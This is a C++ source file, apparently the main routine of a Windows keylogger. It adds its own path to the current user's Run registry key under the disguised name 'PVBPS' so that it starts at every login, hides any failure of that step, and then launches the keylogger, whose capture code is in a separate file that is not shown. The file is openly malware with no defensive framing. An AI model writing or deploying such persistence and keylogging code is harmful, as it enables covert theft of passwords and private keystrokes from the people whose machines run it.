#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>

#include "registry.h"
#include "keylogger.h"

static const std::string path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const HKEY category = HKEY_CURRENT_USER;
static const std::string startKey = "PVBPS";

static void createKeyPath()
{
	if (!RegistryKey::exists(category, path))
	{
		RegistryKey::create(category, path);
	}
}
static bool checkPathMatch(RegistryKey& key, const std::string& name, const std::string& path)
{
	try
	{
		return key.readString(name) == path;
	}
	catch (...)
	{
		return false;
	}
}
static void installRegistry(const std::string& programPath)
{
	createKeyPath();

	RegistryKey key(category, path, KEY_ALL_ACCESS);
	if (key.isValid())
	{
		bool pathMatches = checkPathMatch(key, startKey, programPath);
		if (!pathMatches)
		{
			key.writeString(startKey, programPath);
		}
	}
}

int main(int argc, char** argv)
{
	try
	{
		installRegistry(argv[0]);
	}
	catch (...)
	{
		// registry installation failed
	}
	
	runKeylogger();

	return 0;
}
